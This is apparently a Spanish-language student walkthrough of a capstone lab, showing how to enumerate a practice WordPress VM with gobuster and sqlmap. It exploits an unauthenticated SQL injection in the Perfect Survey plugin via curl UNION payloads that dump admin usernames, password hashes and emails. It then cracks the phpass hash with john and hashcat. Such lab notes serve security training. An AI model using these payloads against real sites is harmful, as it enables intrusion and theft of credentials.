# Walk: SQL Injections Attacks - Module Exercise - VM 1 

## Fecha: 25/01/2025
## Host: Ubuntu
## IP: 192.168.136.47

---

## Objetivo
**Capstone Lab:** Enumerate the Module Exercise - VM #1 and exploit the SQLi vulnerability to get the flag.

---
## Herramientas
1. sqlmap
2. burpsuite
3. gobuster
---
## Procedimiento y comandos
1. Paso 1: Enumeracion:
	- **gobuster -u http://alvida-eatery.org/ -w /usr/shares/wordlists/big.txt -o result-vm1.txt**
	-  ** cat result-vm1.txt **
	/.htaccess            (Status: 403) [Size: 282]
	/.htpasswd            (Status: 403) [Size: 282]
	/server-status        (Status: 403) [Size: 282]
	/wp-admin             (Status: 301) [Size: 325] [--> http://alvida-eatery.org/wp-admin/]
	/wp-content           (Status: 301) [Size: 327] [--> http://alvida-eatery.org/wp-content/]
	/wp-includes          (Status: 301) [Size: 328] [--> http://alvida-eatery.org/wp-includes/]
 - Observamos el directorio **/wp-admin** el formulario de login
2. Paso 2: Luego de varios intentos fallidos con payloads manuales vamos por sqlmap:
	- **sqlmap -u "http://alvida-eatery.org/wp-login.php?redirect_to=http%3A%2F%2Falvida-eatery.org%2Fwp-admin%2F&reauth=1" --batch --risk=3 --level=5**
	- **--batch** : Responde automáticamente las preguntas de sqlmap.
	- **--risk=3**: Realiza pruebas más agresivas.
	- **--level=5**: Examina más parámetros y realiza más pruebas.
	- Paciencia...
	- despues de horas no devolvio nada interesante.
	- La enumeracion con wpscan devolvio un plugin con una version vulnerable a Unauthenticated SQL Injection: **Perfect Survey**
3. Paso 3: Buscamos la prueba de concepto:
	- https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/
	- y la implementamos en el login que obtuvo gobuster
	- **curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"**
	- En esta respuesta estan los datos del usuario admin: 
	Usuario: "admin"
	Contraseña hash: "$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0"
	- Adicionalmente podemos intentar extraer mails:
 	- **curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1 union select 1,1,group_concat(user_login,0x3a,user_email),null,null,null,null,null,null,null,null,null,null,null,null,null from wp_users"**
	
4. Paso 4: Extraer del hash con john el password del usuairo admin:
	- Guardamos el hash en un .txt
	- **john --formater=phpass hash.txt**
	- **john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hash.txt**
	- **john --show hash.txt**
	- darle tiempo.... o usar hashcat:
	- **hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt**

---
## Troubleshooting

---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

